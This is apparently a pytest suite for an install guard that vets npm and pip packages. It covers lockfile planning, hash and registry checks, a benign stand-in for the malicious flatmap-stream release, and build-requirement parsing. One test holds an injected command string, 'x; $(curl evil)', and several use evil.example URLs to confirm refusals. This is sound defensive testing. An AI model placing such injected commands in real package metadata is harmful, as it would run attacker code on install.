"""Packages checked before they are installed (`sources/install_guard.py`, `cordon npm|pip install`).

The package manager and the registry are both stood in for: a runner that writes the lockfile or the
report the real tool would, and a fetcher that serves bytes from memory. The one real scan uses a
tarball that names flatmap-stream 0.1.1, the release behind the 2018 event-stream incident -- a known
record in the bundled intel -- with nothing in it but a manifest.
"""

from __future__ import annotations

import base64
import hashlib
import io
import json
import subprocess
import tarfile
from pathlib import Path
from typing import Any, ClassVar

import pytest

from cordon_scanner.cli.commands.install_guard import InstallGuardCommand
from cordon_scanner.engine.incoming import Incoming
from cordon_scanner.foundation.models import Location
from cordon_scanner.sources.install_guard import (
    UNATTRIBUTED,
    BuildRequires,
    InstallGuard,
    InstallPlan,
    InstallRefused,
    NpmPlanner,
    PackageFile,
    PipPlanner,
)


class InstallKit:
    """Stand-ins for npm, pip and the registry."""

    @staticmethod
    def tarball(name: str, version: str) -> bytes:
        buffer = io.BytesIO()
        with tarfile.open(fileobj=buffer, mode="w:gz") as tar:
            data = json.dumps({"name": name, "version": version, "main": "index.js"}).encode()
            info = tarfile.TarInfo("package/package.json")
            info.size = len(data)
            tar.addfile(info, io.BytesIO(data))
        return buffer.getvalue()

    @staticmethod
    def integrity(data: bytes) -> str:
        return "sha512-" + base64.b64encode(hashlib.sha512(data).digest()).decode()

    @staticmethod
    def lock(entries: dict[str, dict[str, Any]], direct: dict[str, str]) -> dict[str, Any]:
        return {
            "name": "app",
            "lockfileVersion": 3,
            "packages": {"": {"name": "app", "dependencies": direct}, **entries},
        }

    @staticmethod
    def entry(name: str, version: str, data: bytes, **extra: Any) -> dict[str, Any]:
        return {
            "version": version,
            "resolved": f"https://registry.npmjs.org/{name}/-/{name}-{version}.tgz",
            "integrity": InstallKit.integrity(data),
            **extra,
        }

    @staticmethod
    def done(code: int = 0, stderr: str = "") -> subprocess.CompletedProcess[str]:
        return subprocess.CompletedProcess([], code, "", stderr)


class TestTheNpmLockfile:
    def test_every_registry_package_is_planned_with_what_needs_it(self) -> None:
        a, b = InstallKit.tarball("a", "1.0.0"), InstallKit.tarball("b", "2.0.0")
        lock = InstallKit.lock(
            {
                "node_modules/a": InstallKit.entry("a", "1.0.0", a, dependencies={"b": "^2"}),
                "node_modules/b": InstallKit.entry("b", "2.0.0", b),
                "node_modules/local": {"link": True, "resolved": "../local"},
                "node_modules/a/node_modules/inner": {"version": "1.0.0", "inBundle": True},
            },
            {"a": "^1"},
        )
        files = {f.name: f for f in NpmPlanner.files(lock)}
        assert set(files) == {"a", "b"}
        assert files["a"].requested and not files["b"].requested
        assert files["b"].required_by == ("a",)
        assert files["a"].required_by == ("your project",)

    @pytest.mark.parametrize(
        ("change", "why"),
        [
            (
                {"resolved": "http://registry.npmjs.org/a/-/a-1.0.0.tgz"},
                "registry Cordon can fetch",
            ),
            ({"resolved": "https://evil.example/a-1.0.0.tgz"}, "does not fetch from"),
            ({"integrity": "sha1-abc"}, "no sha512 integrity"),
        ],
    )
    def test_anything_it_cannot_verify_refuses_the_install(
        self, change: dict[str, str], why: str
    ) -> None:
        data = InstallKit.tarball("a", "1.0.0")
        lock = InstallKit.lock(
            {"node_modules/a": {**InstallKit.entry("a", "1.0.0", data), **change}}, {"a": "1"}
        )
        with pytest.raises(InstallRefused, match=why):
            NpmPlanner.files(lock)

    def test_the_resolve_runs_no_script_and_writes_only_a_lockfile(self, tmp_path: Path) -> None:
        (tmp_path / "package.json").write_text('{"name": "app"}', encoding="utf-8")
        data = InstallKit.tarball("a", "1.0.0")
        seen: list[list[str]] = []

        def npm(argv: Any, cwd: Path, env: Any) -> subprocess.CompletedProcess[str]:
            seen.append(list(argv))
            lock = InstallKit.lock(
                {"node_modules/a": InstallKit.entry("a", "1.0.0", data)}, {"a": "1"}
            )
            (cwd / "package-lock.json").write_text(json.dumps(lock), encoding="utf-8")
            assert cwd != tmp_path, "the resolve must run in a private copy, never the project"
            return InstallKit.done()

        plan = NpmPlanner.plan(tmp_path, ["install", "a"], npm, "npm")
        assert "--package-lock-only" in seen[0] and "--ignore-scripts" in seen[0]
        assert [f.label for f in plan.files] == ["a@1.0.0"]
        assert not (tmp_path / "package-lock.json").exists(), (
            "the project is untouched until the scan passes"
        )

    def test_workspaces_and_a_failed_resolve_are_refused(self, tmp_path: Path) -> None:
        (tmp_path / "package.json").write_text('{"workspaces": ["packages/*"]}', encoding="utf-8")
        with pytest.raises(InstallRefused, match="workspaces"):
            NpmPlanner.plan(tmp_path, ["install"], lambda *a: InstallKit.done(), "npm")
        (tmp_path / "package.json").write_text("{}", encoding="utf-8")
        with pytest.raises(InstallRefused, match="could not resolve"):
            NpmPlanner.plan(
                tmp_path, ["install", "x"], lambda *a: InstallKit.done(1, "E404"), "npm"
            )


class TestThePipResolve:
    REPORT: ClassVar[dict[str, Any]] = {
        "install": [
            {
                "metadata": {"name": "requests", "version": "2.32.3"},
                "download_info": {
                    "url": "https://files.pythonhosted.org/packages/r/requests-2.32.3-py3-none-any.whl",
                    "archive_info": {"hashes": {"sha256": "ab" * 32}},
                },
                "requested": True,
            }
        ]
    }

    def test_wheels_only_until_an_sdist_is_scanned_then_pinned_to_it(self) -> None:
        calls: list[list[str]] = []
        scanned: list[tuple[str, str]] = []

        def pip(argv: Any, cwd: Path, env: Any) -> subprocess.CompletedProcess[str]:
            calls.append(list(argv))
            if len(calls) == 1:
                return InstallKit.done(1, "ERROR: No matching distribution found for oldpkg")
            constraints = Path(argv[argv.index("-c") + 1]).read_text(encoding="utf-8")
            assert constraints == "oldpkg==0.9\n" and "--no-binary=oldpkg" in argv
            Path(argv[argv.index("--report") + 1]).write_text(
                json.dumps(self.REPORT), encoding="utf-8"
            )
            return InstallKit.done()

        def scan_sdist(name: str, version: str) -> tuple[str, tuple[str, ...]]:
            scanned.append((name, version))
            return "0.9", ()

        plan = PipPlanner.plan(["requests", "oldpkg==0.9"], pip, "pip", scan_sdist)
        assert "--only-binary=:all:" in calls[0] and "--dry-run" in calls[0]
        assert scanned == [("oldpkg", "0.9")]
        assert [f.label for f in plan.files] == ["requests==2.32.3"]

    def test_a_blocked_sdist_stops_before_pip_builds_it(self) -> None:
        def pip(argv: Any, cwd: Path, env: Any) -> subprocess.CompletedProcess[str]:
            return InstallKit.done(1, "No matching distribution found for evil")

        def blocked(name: str, version: str) -> tuple[str, tuple[str, ...]]:
            raise InstallRefused(f"{name} blocked")

        with pytest.raises(InstallRefused, match="evil blocked"):
            PipPlanner.plan(["evil"], pip, "pip", blocked)

    @pytest.mark.parametrize("args", [["-e", "."], ["."], ["./local"], ["file:///tmp/x"]])
    def test_local_and_editable_installs_are_refused(self, args: list[str]) -> None:
        with pytest.raises(InstallRefused, match="local and editable"):
            PipPlanner.plan(args, lambda *a: InstallKit.done(), "pip", lambda n, v: ("", ()))

    @pytest.mark.parametrize(
        ("url", "digest", "why"),
        [
            ("https://evil.example/r.whl", "ab" * 32, "PyPI's file host"),
            ("https://files.pythonhosted.org/r.whl", "", "no sha256"),
        ],
    )
    def test_a_file_it_cannot_verify_refuses(self, url: str, digest: str, why: str) -> None:
        report = {
            "install": [
                {
                    "metadata": {"name": "r", "version": "1"},
                    "download_info": {"url": url, "archive_info": {"hashes": {"sha256": digest}}},
                }
            ]
        }
        with pytest.raises(InstallRefused, match=why):
            PipPlanner.files(report)


class TestTheCheck:
    def test_a_file_that_differs_from_its_registry_hash_is_refused(self, tmp_path: Path) -> None:
        data = InstallKit.tarball("a", "1.0.0")
        file = PackageFile(
            "npm",
            "a",
            "1.0.0",
            "https://registry.npmjs.org/a/-/a-1.0.0.tgz",
            "sha512",
            hashlib.sha512(data).digest(),
        )
        with pytest.raises(InstallRefused, match="does not match"):
            InstallGuard.check(
                InstallPlan("npm", [file]),
                InstallGuardCommand.scanner(Incoming.config(None, None)),
                lambda u, e: data + b"x",
                tmp_path,
            )

    def test_a_known_malicious_release_is_blocked_by_the_real_scan(self, tmp_path: Path) -> None:
        data = InstallKit.tarball("flatmap-stream", "0.1.1")
        file = PackageFile(
            "npm",
            "flatmap-stream",
            "0.1.1",
            "https://registry.npmjs.org/flatmap-stream/-/flatmap-stream-0.1.1.tgz",
            "sha512",
            hashlib.sha512(data).digest(),
            required_by=("event-stream",),
        )
        verdict = InstallGuard.check(
            InstallPlan("npm", [file]),
            InstallGuardCommand.scanner(Incoming.config(None, None)),
            lambda u, e: data,
            tmp_path,
        )
        assert not verdict.ok
        assert set(verdict.blocking) == {file.filename}

    def test_a_clean_package_passes_the_real_scan(self, tmp_path: Path) -> None:
        data = InstallKit.tarball("left-pad-cordon-test", "1.0.0")
        file = PackageFile(
            "npm",
            "left-pad-cordon-test",
            "1.0.0",
            "https://registry.npmjs.org/left-pad-cordon-test/-/left-pad-cordon-test-1.0.0.tgz",
            "sha512",
            hashlib.sha512(data).digest(),
        )
        verdict = InstallGuard.check(
            InstallPlan("npm", [file]),
            InstallGuardCommand.scanner(Incoming.config(None, None)),
            lambda u, e: data,
            tmp_path,
        )
        assert verdict.ok, verdict.blocking

    def test_a_finding_it_cannot_attribute_still_blocks(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        data = InstallKit.tarball("a", "1.0.0")
        file = PackageFile(
            "npm",
            "a",
            "1.0.0",
            "https://registry.npmjs.org/a/-/a-1.0.0.tgz",
            "sha512",
            hashlib.sha512(data).digest(),
        )

        class Stray:
            location = Location(
                path="somewhere/else.js", line=1, column=1, byte_start=0, byte_end=1
            )

        verdict = InstallGuard.check(
            InstallPlan("npm", [file]), lambda d: (Stray(),), lambda u, e: data, tmp_path
        )
        assert set(verdict.blocking) == {UNATTRIBUTED}


class TestTheCommand:
    def test_other_subcommands_run_unchanged(self, monkeypatch: pytest.MonkeyPatch) -> None:
        ran: list[list[str]] = []
        monkeypatch.setattr("shutil.which", lambda tool: f"/usr/bin/{tool}")
        monkeypatch.setattr(
            InstallGuardCommand, "_passthrough", staticmethod(lambda argv: ran.append(argv) or 0)
        )
        assert InstallGuardCommand.main("npm", ["run", "test"]) == 0
        assert InstallGuardCommand.main("pip", ["list"]) == 0
        assert ran == [["/usr/bin/npm", "run", "test"], ["/usr/bin/pip", "list"]]

    def test_a_blocked_npm_install_installs_nothing(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        data = InstallKit.tarball("flatmap-stream", "0.1.1")
        lock = InstallKit.lock(
            {"node_modules/flatmap-stream": InstallKit.entry("flatmap-stream", "0.1.1", data)},
            {"flatmap-stream": "0.1.1"},
        )
        monkeypatch.chdir(tmp_path)
        (tmp_path / "package.json").write_text("{}", encoding="utf-8")
        monkeypatch.setattr("shutil.which", lambda tool: f"/usr/bin/{tool}")

        def npm(argv: Any, cwd: Path, env: Any) -> subprocess.CompletedProcess[str]:
            (cwd / "package-lock.json").write_text(json.dumps(lock), encoding="utf-8")
            return InstallKit.done()

        ran: list[list[str]] = []
        monkeypatch.setattr(
            "cordon_scanner.sources.install_guard.Subprocesses.run", staticmethod(npm)
        )
        monkeypatch.setattr(
            "cordon_scanner.intel.registries.registry_request.RegistryRequest.fetch_bytes",
            staticmethod(lambda u, e: data),
        )
        monkeypatch.setattr(
            InstallGuardCommand, "_passthrough", staticmethod(lambda argv: ran.append(argv) or 0)
        )
        assert InstallGuardCommand.main("npm", ["install", "flatmap-stream@0.1.1"]) == 1
        assert ran == [], "npm ci must never run after a block"
        assert not (tmp_path / "package-lock.json").exists()

    def test_cordon_options_come_off_the_front(self) -> None:
        own, rest = InstallGuardCommand._own_options(
            ["--cordon-fail-on", "high", "--cordon-config=c.yaml", "install", "x"]
        )
        assert own == {"fail-on": "high", "config": "c.yaml"} and rest == ["install", "x"]

    def test_pip_keeps_only_where_and_how_to_install(self) -> None:
        kept = InstallGuardCommand._pip_keep(
            ["--user", "-r", "req.txt", "--index-url", "https://x", "-t", "dir", "requests"]
        )
        assert kept == ["--user", "-t=dir"]


class TestAnSdistsBuildTools:
    @staticmethod
    def sdist(pyproject: str | None) -> bytes:
        buffer = io.BytesIO()
        with tarfile.open(fileobj=buffer, mode="w:gz") as tar:
            files = {"pkg-1.0/setup.py": "from setuptools import setup\nsetup()\n"}
            if pyproject is not None:
                files["pkg-1.0/pyproject.toml"] = pyproject
            for name, text in files.items():
                data = text.encode()
                info = tarfile.TarInfo(name)
                info.size = len(data)
                tar.addfile(info, io.BytesIO(data))
        return buffer.getvalue()

    def test_declared_build_requirements_are_read_without_unpacking(self) -> None:
        data = self.sdist('[build-system]\nrequires = ["hatchling>=1.20"]\n')
        assert BuildRequires.of("pkg-1.0.tar.gz", data) == ("hatchling>=1.20",)

    def test_no_build_system_means_pips_own_default(self) -> None:
        assert BuildRequires.of("pkg-1.0.tar.gz", self.sdist(None)) == BuildRequires.DEFAULT
        assert (
            BuildRequires.of("pkg-1.0.tar.gz", self.sdist("[tool.x]\na = 1\n"))
            == BuildRequires.DEFAULT
        )

    def test_a_requirement_it_cannot_read_safely_refuses(self) -> None:
        with pytest.raises(InstallRefused, match="cannot read safely"):
            BuildRequires.of(
                "pkg-1.0.tar.gz", self.sdist('[build-system]\nrequires = ["x; $(curl evil)"]\n')
            )

    def test_build_tools_are_resolved_wheel_only_and_marked_build_only(self) -> None:
        build_report = {
            "install": [
                {
                    "metadata": {"name": "setuptools", "version": "75.0.0"},
                    "download_info": {
                        "url": "https://files.pythonhosted.org/s/setuptools-75.0.0-py3-none-any.whl",
                        "archive_info": {"hashes": {"sha256": "cd" * 32}},
                    },
                }
            ]
        }
        calls: list[list[str]] = []

        def pip(argv: Any, cwd: Path, env: Any) -> subprocess.CompletedProcess[str]:
            calls.append(list(argv))
            if len(calls) == 1:
                return InstallKit.done(1, "No matching distribution found for docopt")
            report = TestThePipResolve.REPORT if len(calls) == 2 else build_report
            Path(argv[argv.index("--report") + 1]).write_text(json.dumps(report), encoding="utf-8")
            return InstallKit.done()

        plan = PipPlanner.plan(
            ["docopt==0.6.2"], pip, "pip", lambda n, v: ("0.6.2", ("setuptools>=40.8.0",))
        )
        assert calls[2][-1] == "setuptools>=40.8.0" and "--only-binary=:all:" in calls[2]
        assert [(f.name, f.build_only) for f in plan.files] == [
            ("requests", False),
            ("setuptools", True),
        ]
